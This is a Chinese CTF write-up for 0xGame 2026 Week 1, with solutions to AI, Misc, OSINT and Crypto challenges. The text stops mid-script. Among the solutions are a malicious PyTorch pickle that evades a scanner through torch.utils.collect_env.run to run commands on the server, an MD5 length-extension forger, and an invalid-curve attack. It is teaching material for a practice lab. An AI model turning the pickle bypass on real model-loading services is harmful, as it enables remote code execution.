---
title: '0xGame2026-week1-wp'
description: '0xGame 2026 Week1 完整比赛记录，涵盖 Crypto、Misc、AI、Web 等题目，包含 SageMath 实验与 ECDSA 推导。'
date: '2026-10-21T21:09:18+08:00'
category: CTF
tags: [0xGame, Crypto, Python, SageMath, Writeup]
minutes: 86
demo: false
draft: false
---

## AI

### 粗心的小x

chat_export.json找到API key，Base64解码可得 part1:0xGame{D0_n0t_

然后用Git GUI可以找到其余的API key

part2:uplO@d_pr1v4t3

part3:_th1ngs_t0_g1t}

![](../../assets/imports/0xgame2026-week1/image-20261002151627970.png)

![](../../assets/imports/0xgame2026-week1/image-20261002151528072.png)

```text
0xGame{D0_n0t_uplO@d_pr1v4t3_th1ngs_t0_g1t}
```



### ez_pytorch

运行后报错：

```text
Weights only load failed
Unsupported global: GLOBAL exec was not an allowed global by default.
```

把 `model.pth` 当 ZIP 打开后，结构是：

```text
model/
├── data.pkl
├── data/
│   ├── 0
│   ├── 1
│   ├── 2
│   └── 3
├── byteorder
├── version
└── ...
```

```
python -m pickletools model/data.pkl
```

可以看到：

```text
0: \x80 PROTO      2
2: c    GLOBAL     '__builtin__ exec'
...
1647: \x85 TUPLE1
...
1650: R    REDUCE
```

编写脚本：

```python
import zipfile
import base64

with zipfile.ZipFile("model.pth") as z:
    b0 = z.read("model/data/0")
    b1 = z.read("model/data/1").decode()
    b2 = z.read("model/data/2").decode()
    b3 = z.read("model/data/3").decode()

# part 0
key = (0x5A, 0xA3, 0x3C)
p0 = bytes(
    b0[i] ^ key[i % 3]
    for i in range(len(b0))
)

# part 1
p1 = base64.b64decode(b1[::-1])

# part 2
tmp = bytes.fromhex(b2)
p2 = bytes(
    (tmp[i] - i) & 0xff
    for i in range(len(tmp))
)

# part 3
tmp = base64.b64decode(b3)
p3 = bytes(
    tmp[0] ^ 0xA5 if i == 0
    else tmp[i] ^ tmp[i - 1]
    for i in range(len(tmp))
)

flag = (p0 + p1 + p2 + p3).decode()
print(flag)
```

```text
0xGame{3z_p1ckl3_fOr_pyt0rch}
```



### Magical Large Potato!

`.pth` 是一个字典：

```python
dict_keys(['magic1', 'magic2'])
```

其中：magic2 = 23

而 `magic1` 是 `state_dict`，参数形状：

```python
embedding.weight     (23, 32)

deep_mlp.0.weight    (128, 32)
deep_mlp.0.bias      (128,)

deep_mlp.2.weight    (256, 128)
deep_mlp.2.bias      (256,)

deep_mlp.4.weight    (128, 256)
deep_mlp.4.bias      (128,)

deep_mlp.6.weight    (100, 128)
deep_mlp.6.bias      (100,)
```

有两个很明显的提示：有 **23 个 embedding**，同时：magic2 = 23，最终 flag 恰好也是 23 个字符。

推测原模型大概率类似：

```python
nn.Sequential(
    nn.Linear(32, 128),
    nn.ReLU(),

    nn.Linear(128, 256),
    nn.ReLU(),

    nn.Linear(256, 128),
    nn.ReLU(),

    nn.Linear(128, 100)
)
```

因为 `ReLU` 没有参数，所以不会出现在 `state_dict` 中，于是只有：

```text
0
2
4
6
```

这几个 Linear 层。

把 23 个 embedding 逐个送进这个 MLP，然后对最后的 100 维结果取 `argmax`。

```python
import torch
import torch.nn.functional as F
import string

data = torch.load(
    "Magic_Large_Potato.pth",
    map_location="cpu",
    weights_only=True
)

state = data["magic1"]

# 23 x 32
x = state["embedding.weight"]

# Linear + ReLU
x = F.linear(
    x,
    state["deep_mlp.0.weight"],
    state["deep_mlp.0.bias"]
)
x = F.relu(x)

x = F.linear(
    x,
    state["deep_mlp.2.weight"],
    state["deep_mlp.2.bias"]
)
x = F.relu(x)

x = F.linear(
    x,
    state["deep_mlp.4.weight"],
    state["deep_mlp.4.bias"]
)
x = F.relu(x)

# 最后一层不用 ReLU
x = F.linear(
    x,
    state["deep_mlp.6.weight"],
    state["deep_mlp.6.bias"]
)

# 每个 embedding 对应一个字符类别
indices = x.argmax(dim=1).tolist()

print(indices)

charset = (
    string.digits
    + string.ascii_lowercase
    + string.ascii_uppercase
    + string.punctuation
)

flag = "".join(charset[i] for i in indices)

print(flag)
```

```text
0xGame{MLP_1s_s0_m4g1c}
```



### hd_pytorch?

经过一些尝试

```text
⛔ 检测到恶意文件，已被拦截！
```

```text
⚠ 警告：检测到不安全加载
该文件包含 weights_only 白名单之外的对象，已降级为兼容模式加载。
```

有黑名单。扫描器在静态扫 pickle 字节码里的危险 GLOBAL（os、subprocess、eval、exec、builtins 等）

找到了`torch.utils.collect_env.run`**（2025 年公开的 picklescan 绕过）**

```python
import torch

class E:
    def __reduce__(self):
        from torch.utils.collect_env import run
        return (run, ("cat /flag",))

torch.save(E(), "exploit.pth")
```

```text
⚠ 警告：检测到不安全加载
该文件包含 weights_only 白名单之外的对象，已降级为兼容模式加载。

[
  0,
  "0xGame{03b5e4dc-fcf1-439f-bf48-000565783d7e}",
  ""
]
← 返回继续上传
```

```text
0xGame{03b5e4dc-fcf1-439f-bf48-000565783d7e}
```



## Misc

### Interesting_ppt

将pptx解压即可，0xgame/docProps/custom.xml找到密文`fTAvKTQybl5VAXRHHA8JCygHfFZTWGYCIydUDQcBX0pVdkB3AwA3OVBnZAZpLxUJCSIZVFJYeAIiHysLPDV8AFFcYk0kUFRQEnpmCw==`

0xgame/docProps/core.xml找到`a2V5PTB4R2FtZV8yMDI2`

最后是三层套娃，感觉对新生不是那么友好

![](../../assets/imports/0xgame2026-week1/image-20261002152242792.png)

```text
0xGame{pptx_1s_just_a_z1p_4nd_metadata_n3ver_b3tr4ys_y0u}
```





### 奶蛙的博客

老规矩F12

```text
// 奶蛙的博客 - site script
// HINT: flag 被 gzip 压缩、base64 编码后拆成了碎片，每页一块，按 id 顺序拼起来。
console.log("[naiwa] hint: gzip -> base64 -> split, join fragments in id order");
```

```python
import base64
import html
import re
import ssl
import time
import urllib.error
import urllib.request
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://8000-31001396-06d8-476f-aa3a-a634c8a98d65.challenge.ctfplus.cn/page?id={}"
TOTAL = 124
MAX_WORKERS = 16
RETRIES = 3

PATTERN = re.compile(
    r'''<span\b(?=[^>]*\bclass=["'][^"']*\bflag-fragment\b[^"']*["'])'''
    r'''[^>]*>(.*?)</span>''',
    re.IGNORECASE | re.DOTALL,
)

# 使用自签名证书，因此仅在本脚本中关闭证书验证
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

def fetch(pid):
    url = BASE.format(pid)

    request = urllib.request.Request(
        url,
        headers={
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html",
            "Connection": "close",
        },
    )

    last_error = None

    for attempt in range(1, RETRIES + 1):
        try:
            with urllib.request.urlopen(
                request,
                timeout=25,
                context=SSL_CONTEXT,
            ) as response:
                page = response.read().decode("utf-8", errors="replace")

            match = PATTERN.search(page)
            if not match:
                raise RuntimeError("页面中没有找到 flag-fragment")

            fragment = html.unescape(match.group(1)).strip()

            if not fragment:
                raise RuntimeError("找到的 flag-fragment 内容为空")

            return pid, fragment

        except Exception as exc:
            last_error = exc

            if attempt < RETRIES:
                time.sleep(attempt)

    raise RuntimeError(
        f"id={pid} 连续请求 {RETRIES} 次失败: {last_error}"
    ) from last_error


def main():
    fragments = {}
    errors = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(fetch, pid): pid
            for pid in range(1, TOTAL + 1)
        }

        for future in as_completed(futures):
            pid = futures[future]

            try:
                result_pid, fragment = future.result()
                fragments[result_pid] = fragment
                print(f"[+] id={result_pid:03d} 获取成功")
            except Exception as exc:
                errors.append((pid, str(exc)))
                print(f"[-] id={pid:03d} 获取失败: {exc}")

    if errors:
        print("\n以下页面获取失败：")
        for pid, error in sorted(errors):
            print(f"  id={pid}: {error}")
        raise SystemExit("存在获取失败的页面，请重新运行脚本。")

    missing = [
        pid
        for pid in range(1, TOTAL + 1)
        if pid not in fragments
    ]

    if missing:
        raise SystemExit(f"缺少片段，对应 ID：{missing}")

    # 必须严格按照整数 ID 顺序拼接
    encoded = "".join(
        fragments[pid]
        for pid in range(1, TOTAL + 1)
    )

    # 移除可能存在的空白字符
    encoded = re.sub(r"\s+", "", encoded)

    # 补齐 Base64 padding
    encoded += "=" * (-len(encoded) % 4)

    try:
        compressed = base64.b64decode(encoded, validate=True)
    except (ValueError, base64.binascii.Error) as exc:
        raise SystemExit(
            f"Base64 解码失败，拼接后的长度为 {len(encoded)}: {exc}"
        ) from exc

    try:
        # 47 可以自动识别 gzip 或普通 zlib 数据
        decoded = zlib.decompress(compressed, wbits=47)
    except zlib.error as exc:
        print(f"解码后数据前 16 字节：{compressed[:16].hex()}")
        raise SystemExit(
            f"解压失败，片段内容或顺序可能不正确: {exc}"
        ) from exc

    try:
        flag = decoded.decode("utf-8")
    except UnicodeDecodeError:
        print("解压成功，但结果不是 UTF-8 文本：")
        print(decoded)
    else:
        print("\nFlag:")
        print(flag)


if __name__ == "__main__":
    main()

```



爬虫入门

```text
0xGame{n41w4_l4ugh5_cr4wl5_4nd_c0ll3ct5_3v3ry_fr4gm3nt_4cr055_th3_1nt3rn3t}
```



### ez_traffic

非预期，直接 binwalk

```bash
(base) ┌──(rekjo㉿LAPTOP-BMERJF8L)-[/mnt/e/Downloads/ez_traffic/ez_traffic/ez_traffic]
└─$ binwalk -e *

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
22518         0x57F6          Zip archive data, at least v2.0 to extract, compressed size: 54, uncompressed size: 52, name: secret.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented


(base) ┌──(rekjo㉿LAPTOP-BMERJF8L)-[/mnt/e/Downloads/ez_traffic/ez_traffic/ez_traffic]
└─$ cat _traffic_http.pcap.extracted/secret.txt
MHhHYW1le3RyQGZmMWNfYW5hMXk1aXNfaTVfZlVuX2g3N3AhfQ==
```

```text
0xGame{tr@ff1c_ana1y5is_i5_fUn_h77p!}
```



### Treasure_island

`real_map.txt` 是一张清单（chart），每一行是一条记录。而 clue 里说"Count what the chart keeps, and the count will name the chest"——数一下这张表里有多少条记录，那个数字就是箱子的名字。

```bash
cd ~/treasure_island
wc -l real_map.txt
```

```bash
player@dep-67691303-31d1-459e-a41d-3ed7e77acba4-5d9879c67-4k8dp:~/treasure_island$ cat chest/box_784.txt
🏆 You found the real treasure chest!

The chest is empty. The gold was moved to /tmp/flag —
but a keeper's heartbeat seals it.

Somewhere on this island a heart keeps beating,
re-locking /tmp/flag with every beat.
Silence the heart, and erase its mark,
or it will never let the gold go.

(ps: the watcher below shows no mercy to half-done work.)
player@dep-67691303-31d1-459e-a41d-3ed7e77acba4-5d9879c67-4k8dp:~/treasure_island$ cat /tmp/flag
cat: /tmp/flag: Permission denied
```

有个后台进程在循环“上锁” `/tmp/flag`。

① 找到并干掉这个进程（silence the heart）；② 删掉它留下的标记文件（erase its mark）；③ 再读 flag。

```bash
player@dep-67691303-31d1-459e-a41d-3ed7e77acba4-5d9879c67-4k8dp:~/treasure_island$ ps aux
ps -ef | grep -v grep | grep -Ei 'keeper|heart|watch|lock|flag|beat'
pgrep -a .
top -b -n 1 | head -20
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4460  3676 ?        Ss   02:57   0:00 /bin/bash /etc/.flagd/entrypoint.
root          15  0.0  0.0   4328  3368 ?        S    02:57   0:00 /bin/bash /etc/.flagd/respawn.sh
root          16  0.1  0.0   4328  3540 ?        S    02:57   0:01 /bin/bash /etc/.flagd/watchdog.sh
root          21  0.0  0.0   4312  2744 ?        S    02:57   0:00 runuser -u player -- env -i /bin/
player        25  0.0  0.0   4328  3412 ?        S    02:57   0:00 /bin/bash /opt/.whisper/heartbeat
root          27  0.0  0.0  12020  4144 ?        Ss   02:57   0:00 sshd: /usr/sbin/sshd [listener] 0
root         106  0.0  0.0  12532  9076 ?        Ss   02:57   0:00 sshd: player [priv]
player       152  0.0  0.0  12792  6372 ?        S    02:57   0:00 sshd: player@pts/0
player       153  0.0  0.0   5020  4264 pts/0    Ss   02:57   0:00 -bash
root        3058  0.0  0.0   2700  1072 ?        S    03:11   0:00 sleep 60
player      3192  0.0  0.0   2700  1052 ?        S    03:11   0:00 sleep 2
root        3195  0.0  0.0   2700  1084 ?        S    03:11   0:00 sleep 1
player      3196  0.0  0.0   8288  4256 pts/0    R+   03:11   0:00 ps aux
root           1       0  0 02:57 ?        00:00:00 /bin/bash /etc/.flagd/entrypoint.sh
root          15       1  0 02:57 ?        00:00:00 /bin/bash /etc/.flagd/respawn.sh
root          16       1  0 02:57 ?        00:00:01 /bin/bash /etc/.flagd/watchdog.sh
root          21      15  0 02:57 ?        00:00:00 runuser -u player -- env -i /bin/bash /opt/.whisper/heartbeat.sh
player        25      21  0 02:57 ?        00:00:00 /bin/bash /opt/.whisper/heartbeat.sh
1 /bin/bash /etc/.flagd/entrypoint.sh
15 /bin/bash /etc/.flagd/respawn.sh
16 /bin/bash /etc/.flagd/watchdog.sh
21 runuser -u player -- env -i /bin/bash /opt/.whisper/heartbeat.sh
25 /bin/bash /opt/.whisper/heartbeat.sh
27 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
106 sshd: player [priv]
152 sshd: player@pts/0
153 -bash
3058 sleep 60
3192 sleep 2
3195 sleep 1
top - 03:11:41 up 454 days, 23:16,  0 user,  load average: 2.08, 2.36, 1.99
Tasks:  14 total,   1 running,  13 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.2 us,  0.0 sy,  0.0 ni, 99.8 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem : 128873.2 total,  11165.7 free,  20176.5 used, 100649.4 buff/cache
MiB Swap:      0.0 total,      0.0 free,      0.0 used. 108696.6 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
      1 root      20   0    4460   3676   3320 S   0.0   0.0   0:00.05 entrypo+
     15 root      20   0    4328   3368   3120 S   0.0   0.0   0:00.01 respawn+
     16 root      20   0    4328   3540   3288 S   0.0   0.0   0:01.16 watchdo+
     21 root      20   0    4312   2744   2480 S   0.0   0.0   0:00.00 runuser
     25 player    20   0    4328   3412   3168 S   0.0   0.0   0:00.26 bash
     27 root      20   0   12020   4144   3008 S   0.0   0.0   0:00.00 sshd
    106 root      20   0   12532   9076   7740 S   0.0   0.0   0:00.06 sshd
    152 player    20   0   12792   6372   4764 S   0.0   0.0   0:00.30 sshd
    153 player    20   0    5020   4268   3612 S   0.0   0.0   0:00.03 bash
   3058 root      20   0    2700   1072    980 S   0.0   0.0   0:00.00 sleep
   3192 player    20   0    2700   1052    964 S   0.0   0.0   0:00.00 sleep
   3195 root      20   0    2700   1084    992 S   0.0   0.0   0:00.00 sleep
   3201 player    20   0    9272   5024   3132 R   0.0   0.0   0:00.00 top
```

读取.sh

```bash
player@dep-67691303-31d1-459e-a41d-3ed7e77acba4-5d9879c67-4k8dp:~/treasure_island$ cat /opt/.whisper/heartbeat.sh
ls -la /opt/.whisper/
cat /etc/.flagd/watchdog.sh 2>/dev/null
cat /etc/.flagd/respawn.sh 2>/dev/null
ls -la /etc/.flagd/
#!/bin/bash
# The Keeper's heartbeat. While this heart beats, the watcher keeps
# /tmp/flag sealed. Silence the heartbeat AND erase this script,
# and the watcher will set the flag free.
while true; do
  sleep 2
done
total 12
drwxr-xr-x 1 player player 4096 Sep 27 08:43 .
drwxr-xr-x 1 root   root   4096 Sep 27 08:43 ..
-rwxr-xr-x 1 player player  217 Sep 27 08:31 heartbeat.sh
ls: cannot open directory '/etc/.flagd/': Permission denied
```



```bash
pkill -f heartbeat && rm -f /opt/.whisper/heartbeat.sh && sleep 2 && cat /tmp/flag
```

即可获取flag



### 欢迎来到CTF的世界！

`MHhHYW1le3dlbGNvbWVfdDBfdGhlX3cwcmxkX29mX0NURiF9` base64解码

```text
0xGame{welcome_t0_the_w0rld_of_CTF!}
```



### Strange_lsb

异或型LSB

```python
from PIL import Image
import numpy as np

im = Image.open("challenge.png").convert("RGB")
a = np.array(im, dtype=np.uint8)

idx = ((a[...,0]&1) << 2) | ((a[...,1]&1) << 1) | (a[...,2]&1)
pal = [0,0,0, 255,0,0, 0,255,0, 0,0,255, 255,255,0, 255,0,255, 0,255,255, 255,255,255]
out = Image.fromarray(idx.astype(np.uint8), "P"); out.putpalette(pal)
out.save("plane0_8color.png")

print("done")
```



```text
0xGame{LSB_x0r_Pl4n3_1s_4w3s0m3!}
```



### 小伊卡...不胖...不胖...

简单的修改图片高度

```text
0xGame{w0w_thi5_1s_thE_tru3_Length}
```





### 模糊二维码

首先比较阴险的是**需要旋转90°**，因为校验符外围是5*5的黑色正方形，不可能出现在左下角。

然后根据比较完整的一行，数出来大概率是29*29的二维码。

手拼即可，根据左上角定位符的那一行可以确定出纠错等级为Q，掩码等级为0.

![](../../assets/imports/0xgame2026-week1/image-20261002145202124.png)

![](../../assets/imports/0xgame2026-week1/download.png)

```text
0xGame{QR_c0de&3rr0r_(oRr3c7iOn}
```



### 深夜值班室

![](../../assets/imports/0xgame2026-week1/image-20261004190520089.png)

对准打印机处右键获得口令 watch2026

```bash
/ops login nightowl watch2026
```

```text
02:50:03 backupd scheduled backup #7 stored (owner: chensy, tag: handover-final)
03:11:08 chensy backup restore --id 7 -> OK
```

```bash
/ops backup restore --id 7
```

获得门禁码 3117

```bash
/ops door unlock 3117
```

进入屋子之后即可获得 flag

```text
0xGame{c37b8c38-1354-46fb-87a2-bc66afbaf4d6}
```





## Osint

### Spring的旅程-1

南邮嘛肯定在`江苏省_南京市`啦

一不小心就用浏览器搜到了blog：`https://www.springbot.top/nctf-2026-wp/`

exiftool 解出 手机型号为 `HUAWEI/nova 14`

时间显然是 `2026年04月06日19:22:45`

第五题有点难。AI 大人看出来是地铁站了，我还真没想到

`马群(地铁站)`

图片尾附加数据：

```text
4D 48 4E 70 62 6E 52 66 62 57 46 7A 64 47 56 79 50 77 3D 3D
```

base64解码得到 `0sint_master?`



### Spring的旅程-2

不难发现图片背景里面的 `北山大厦`

然后把附近的地理坐标转成百度墨卡托，得到一个大致中心，比如：

```text
X ≈ 13374xxx
Y ≈ 3517xxx
```

于是可以直接枚举附近的整数点：

```python
import hashlib

target = "fcfae8501b64417c529ba930fe683bb8"

for x in range(13374000, 13374700):
    for y in range(3516800, 3517500):
        flag = f"0xGame{{{x},{y}}}"

        if hashlib.md5(flag.encode()).hexdigest() == target:
            print(flag)
            raise SystemExit
```

最后得到：

```text
0xGame{13374315,3517141}
```





### 至此,我将独自前行...

> “你像窝在被子里的舒服，却又像风捉摸不住”

是《红色高跟鞋》的歌词。

搜索到 https://www.bilibili.com/video/BV1db4y117Q1/?spm_id_from=333.337.search-card.all.click&vd_source=7119de8ded3d49fa9f82ff02e78fa678

这个投稿非常关键：它有两个分 P，第二 P 的名字就叫：

```text
A.S.F.03019
```

真正的机关在 **`03019`**。

把它理解成老 B 站的：av3019

![](../../assets/imports/0xgame2026-week1/image-20261002154556276.png)

```text
BV1xx411c7HE
```

![](../../assets/imports/0xgame2026-week1/image-20261002154729048.png)

![](../../assets/imports/0xgame2026-week1/image-20261002154744912.png)

![](../../assets/imports/0xgame2026-week1/image-20261002154806114.png)



于是可得flag

```text
0xGame{BV1db4y117Q1_A.S.F.03019_2010-02-22-20:25:24}
```



## Crypto

### decode for love

```text
🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅👁☺❓🚨🍴🥋🌊🏹🕹🐘🛩🍵😊🔪🍍🖐❓😂🐍✅👣🌊🍎🔬☺🛩☃🐎🐎🚰🖐📂🌪🚰🐎🚪🐅🤣🎅🔄🐅😆🔪☺💵🍍🌉🏹🚨🍴🌉😀🐅
```

:D 依旧emoji

https://emoji-aes.miaotony.xyz/ 用 `0x2026` 解密可得 `TFVKVktQVU5OTEFBQQ==`

base64解码：

```text
LUJVKPUNNLAAA
```

接下来挺难的，凯撒7，问题是这个flag太难看出来了

https://caesar-cipher.org/zh

后来找到了这个网站，可以对暴力结果进行排名，还挺实用的

```text
0xGame{ENCODINGGETTT}
```



### 天使大人

sage跑一下得到 `e834598ba8cf6695cc9299364fe4fa63b05a1b55f847ab5aecb6d5dc251e2b77`

```text
0xGame{r34lly g00d st3p f0rw4ord}
```



### 四月是你的谎言

考的是MD5长度扩展攻击

服了，找不到好用的hashpump库。

```python
#!/usr/bin/env python3
import math
import struct

S = (
    [7, 12, 17, 22] * 4
    + [5, 9, 14, 20] * 4
    + [4, 11, 16, 23] * 4
    + [6, 10, 15, 21] * 4
)

K = [
    int((1 << 32) * abs(math.sin(i + 1))) & 0xffffffff
    for i in range(64)
]


def left_rotate(value, bits):
    return ((value << bits) | (value >> (32 - bits))) & 0xffffffff


def md5_compress(block, state):
    """处理一个 64 字节 MD5 数据块"""
    a, b, c, d = state
    A, B, C, D = a, b, c, d
    words = struct.unpack("<16I", block)

    for i in range(64):
        if i < 16:
            f = (B & C) | ((~B) & D)
            g = i
        elif i < 32:
            f = (D & B) | ((~D) & C)
            g = (5 * i + 1) % 16
        elif i < 48:
            f = B ^ C ^ D
            g = (3 * i + 5) % 16
        else:
            f = C ^ (B | (~D))
            g = (7 * i) % 16

        f = (f + A + K[i] + words[g]) & 0xffffffff

        A, D, C, B = (
            D,
            C,
            B,
            (B + left_rotate(f, S[i])) & 0xffffffff,
        )

    return (
        (a + A) & 0xffffffff,
        (b + B) & 0xffffffff,
        (c + C) & 0xffffffff,
        (d + D) & 0xffffffff,
    )


def md5_length_extension(old_digest, original_length, suffix):
    # 从已知摘要恢复 MD5 内部状态
    state = struct.unpack(
        "<4I",
        bytes.fromhex(old_digest),
    )

    # 原始 key + message 的 MD5 padding
    original_padding = (
        b"\x80"
        + b"\x00" * ((55 - original_length) % 64)
        + struct.pack("<Q", original_length * 8)
    )

    # 追加 suffix 后，继续构造最后一轮 padding
    total_length = (
        original_length
        + len(original_padding)
        + len(suffix)
    )

    suffix_padding = (
        suffix
        + b"\x80"
        + b"\x00" * ((55 - total_length) % 64)
        + struct.pack("<Q", total_length * 8)
    )

    # 从旧摘要代表的内部状态继续计算
    for offset in range(0, len(suffix_padding), 64):
        block = suffix_padding[offset:offset + 64]
        state = md5_compress(block, state)

    return b"".join(
        struct.pack("<I", word)
        for word in state
    ).hex()


if __name__ == "__main__":
    old_digest = "46af62962126aa38e4f1680a6c64bc6b"
    message = b"YOU DID LIVE IN MY HEART"
    suffix = b" TOO"

    # 枚举未知 key 长度
    for key_length in range(0, 65):
        total_length = key_length + len(message)

        forged_digest = md5_length_extension(
            old_digest,
            total_length,
            suffix,
        )

        print(
            f"key_len={key_length:2d} "
            f"digest={forged_digest}"
        )
```

```text
key_len= 0 digest=1577a52a3a88f80645a7e977801ae5d2
```

得到 flag

```text
0xGame{you lie in April}
```

> 这个 flag 有点草率了，严重怀疑有 AI 能猜（瞎编）出来



### [深具传统的ECC之诞生]

```bash
└─$ nc nc1.ctfplus.cn 14158
[+] Invalid Touch
[+] p = 380025560263444925282186340357451425457046895363401263284043
[+] E: y^2 = x^3 + 3*x + 0 mod p
[+] A pair of points was randomly selected.
[+] G = (89416635389252243162818482998273067753365476637225933437342, 246277781258250668709138589808946483685012465285148814183503)
[+] Q = (329460413071651533403262472631632126805896556373758724864455, 299273891016902567464505544081763716760408274149519169100436)
[+] Q = bytes_to_long(flag) * G
```

计算可知是无效曲线攻击

```sage
p = 380025560263444925282186340357451425457046895363401263284043
a = 3

Gx = 89416635389252243162818482998273067753365476637225933437342
Gy = 246277781258250668709138589808946483685012465285148814183503

Qx = 329460413071651533403262472631632126805896556373758724864455
Qy = 299273891016902567464505544081763716760408274149519169100436

# 1. 恢复真实的参数 b'
# 公式: b' = y^2 - x^3 - a*x (mod p)
F = GF(p)
b_prime = F(Gy)^2 - F(Gx)^3 - a*F(Gx)
print(f"[*] 真实的曲线参数 b' = {b_prime}")

# 2. 构造真实的椭圆曲线 E'
E_prime = EllipticCurve(F, [a, b_prime])

# 3. 在真实曲线上定义点
G_prime = E_prime(Gx, Gy)
Q_prime = E_prime(Qx, Qy)

# 4. 利用 Pohlig-Hellman 算法求解 ECDLP
print("[*] 正在计算离散对数 (由于阶是光滑的，这只需要几秒钟)...")
k = discrete_log(Q_prime, G_prime, operation='+')
print(f"[+] 成功计算出 k = {k}")

# 5. 将 k 转换为 Flag 字符串
flag = int(k).to_bytes((int(k).bit_length() + 7) // 8, 'big').decode('utf-8', 'ignore')
print(f"[+] Flag: {flag}")
```



```text
0xGame{master's touch}
```



### RSA 永恒花园

首先注意到 `n<c`，于是根据 hint1 ，n 至少丢失了一位，不妨猜测是最后一位**（应该是防ai的题目）**

```python
#!/usr/bin/env python3
import json
import re
import time
import urllib.parse
import urllib.request


E = 65537
BAD_N = int(
    "1094173864157052742180970732204035761200373294544920599091384213147634998428893478471799725789126733249762575289978183379707653724402714674353159335433389"
)
C = int(
    "10073137615027377140510981218791415001906117916633551597480408677492183003649126231396950464383049976806132394959240819342154566927353181638708426838182688"
)


def query_factordb(number: int) -> dict:
    url = "https://factordb.com/api?query=" + urllib.parse.quote(str(number))
    request = urllib.request.Request(
        url,
        headers={"User-Agent": "rsa-dirty-solver/1.0"},
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        return json.loads(response.read())


def get_two_large_factors(number: int):
    """Return p, q only when FactorDB reports exactly two factors."""
    data = query_factordb(number)
    factors = data.get("factors", [])

    # FactorDB entries are [factor_as_string, exponent].
    if len(factors) != 2:
        return None, data
    if any(int(exponent) != 1 for _, exponent in factors):
        return None, data

    p, q = (int(factor) for factor, _ in factors)
    if p * q != number:
        return None, data

    # The intended factors are approximately 256-bit primes.
    if min(p.bit_length(), q.bit_length()) < 240:
        return None, data

    return (p, q), data


def decrypt_rsa(p: int, q: int, e: int, c: int) -> bytes:
    n = p * q
    if c >= n:
        raise ValueError("ciphertext is not smaller than the recovered modulus")

    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    m = pow(c, d, n)
    return m.to_bytes((m.bit_length() + 7) // 8, "big")

def main():
    print(f"[*] Trying n = BAD_N * 10 + digit")

    for digit in range(10):
        candidate_n = BAD_N * 10 + digit

        if candidate_n <= C:
            print(f"[-] digit={digit}: candidate n <= c")
            continue

        try:
            factors, data = get_two_large_factors(candidate_n)
        except Exception as exc:
            print(f"[!] digit={digit}: FactorDB error: {exc}")
            continue

        print(f"[*] digit={digit}: status={data.get('status')}")

        if factors is None:
            time.sleep(0.3)
            continue

        p, q = factors
        print(f"[+] Found candidate modulus with final digit {digit}")
        print(f"p = {p}")
        print(f"q = {q}")

        flag = decrypt_rsa(p, q, E, C)
        print(f"[+] Raw plaintext (repr): {flag!r}")

    print("[-] No suitable last-digit candidate was found in FactorDB")


if __name__ == "__main__":
    main()
```

成功恢复的 n 是

```text
10941738641570527421809707322040357612003732945449205990913842131476349984288934784717997257891267332497625752899781833797076537244027146743531593354333897
```

可以得到

```text
0xGame{%you_¥have@keen#eyes&for*Crypto!}
```

非英文数字全部清洗掉

```text
0xGame{youhavekeeneyesforCrypto}
```



### 约会大作战

+ 恢复 a

服务端给出：$A = g^a \mod p $

并提供多个 `B` 和对应的哈希 `H`。p是光滑数

```text
p - 1 =
2 × 1019 × 1021 × 1031 × 1033 × 1039 × 1049
× 1051 × 1061 × 1063 × 1069 × 1087 × 1091 × q
```

其中 `q` 是一个很大的素数。

12 个 `B` 被特意构造成了小阶元素，它们的阶分别是：

```text
1019, 1021, 1031, 1033, 1039, 1049,
1051, 1061, 1063, 1069, 1087, 1091
```

服务端的哈希形式是：

```
sha256(long_to_bytes(pow(B, a, p))).hexdigest()
```

因此对于每个 `B`，只需要枚举很小的指数：

```python
for x in range(order):
    shared = pow(B, x, p)
    digest = sha256(long_to_bytes(shared)).hexdigest()

    if digest == H:
        print("a =", x, "mod", order)
```

得到：

```
a mod 1019 = 696
a mod 1021 = 66
a mod 1031 = 407
a mod 1033 = 772
a mod 1039 = 782
a mod 1049 = 263
a mod 1051 = 443
a mod 1061 = 737
a mod 1063 = 853
a mod 1069 = 36
a mod 1087 = 984
a mod 1091 = 122
```

使用 CRT 合并：

```text
a = 4864282585427355431495804301385912
```

+ 构造 m

进入第二阶段后，服务端给出新的 `B`，并计算：

```python
M = pow(B, m, p)
choice = long_to_bytes(M)[-1:]
```

也就是说，只要找到一个 `m`，使得最低字节等于目标选项的 ASCII 值即可：

```
A = 65
B = 66
C = 67
```



```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import re
import socket


HOST = "nc1.ctfplus.cn"
PORT = 39359

# The small prime factors
SMALL_PRIMES = [
    1019, 1021, 1031, 1033, 1039, 1049,
    1051, 1061, 1063, 1069, 1087, 1091,
]


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def parse_int(pattern: bytes, data: bytes) -> int:
    match = re.search(pattern, data)
    if not match:
        raise RuntimeError(f"could not find {pattern!r}")
    return int(match.group(1))


def int_bytes(value: int) -> bytes:
    return value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")


def crt(residues: list[int], moduli: list[int]) -> int:
    modulus = 1
    for item in moduli:
        modulus *= item

    result = 0
    for residue, item in zip(residues, moduli):
        partial = modulus // item
        result += residue * partial * pow(partial, -1, item)
    return result % modulus


def recover_a(p: int, g: int, A: int, Bs: list[int], hashes: list[str]) -> int:
    residues = []
    moduli = []

    for index, (B, expected_hash) in enumerate(zip(Bs, hashes)):
        order = next(
            (prime for prime in SMALL_PRIMES if pow(B, prime, p) == 1),
            None,
        )
        if order is None:
            raise RuntimeError(f"B[{index}] has no expected small prime order")

        residue = None
        for candidate in range(order):
            shared = pow(B, candidate, p)
